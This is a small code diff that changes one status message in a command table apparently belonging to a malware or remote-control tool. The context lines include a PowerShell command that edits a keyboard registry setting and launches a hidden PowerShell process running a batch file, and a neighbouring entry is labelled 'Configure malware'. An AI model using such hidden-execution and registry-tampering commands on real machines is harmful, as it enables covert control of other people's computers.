@@ -23,7 +23,7 @@ GLOBAL_OPTIONS = {
     "Capture screenshot": (
         "cd c:/System; Set-ItemProperty -Path 'HKCU:\\Control Panel\\Keyboard' -Name 'PrintScreenKeyForSnippingEnabled' -Value 00000000; $proc = Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -Command \"C:\\System\\init_ds.bat\"' -PassThru; Start-Sleep -Seconds 3; $mpid = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 -ExpandProperty Id",
         "pkill -f feh",
-        "Screenshot was saved to out/capture.png."
+        "Screenshot was saved to the out/ directory."
     ),
     
     "Configure malware": {
